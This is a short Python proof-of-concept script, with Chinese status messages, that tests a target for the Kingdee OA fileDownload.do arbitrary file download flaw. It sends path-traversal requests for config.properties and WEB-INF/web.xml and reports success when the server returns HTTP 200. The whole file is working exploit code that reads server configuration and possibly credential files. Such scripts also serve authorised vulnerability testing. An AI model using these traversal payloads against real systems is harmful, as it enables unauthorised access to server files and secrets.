import time
import requests
import urllib3
from rich.console import Console

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

proxies={'http':'http://127.0.0.1:8080'}
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", 
        }
    vuln_url=target_url+'oa/fileDownload.do?type=File&path=/../oaconsole/config/config.properties'
    exp_url = target_url+"oa/fileDownload.do?type=File&path=/../webapp/WEB-INF/web.xml"
    console.print(now_time() + " [INFO]     正在检测金蝶OA fileDownload 任意文件下载漏洞", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        respones1 = requests.get(exp_url, headers=headers, verify=False)
        respones2 = requests.get(vuln_url, headers=headers, verify=False)
        if respones1.status_code == 200:
            console.print(now_time() + ' [SUCCESS]  金蝶OA 任意文件下载漏洞存在{}'.format(exp_url), style='bold green')
        elif respones2.status_code == 200:
            console.print(now_time() + ' [SUCCESS]  金蝶OA 任意文件下载漏洞存在 任意文件下载漏洞存在{}'.format(vuln_url), style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  金蝶OA 任意文件下载漏洞不存在', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
   
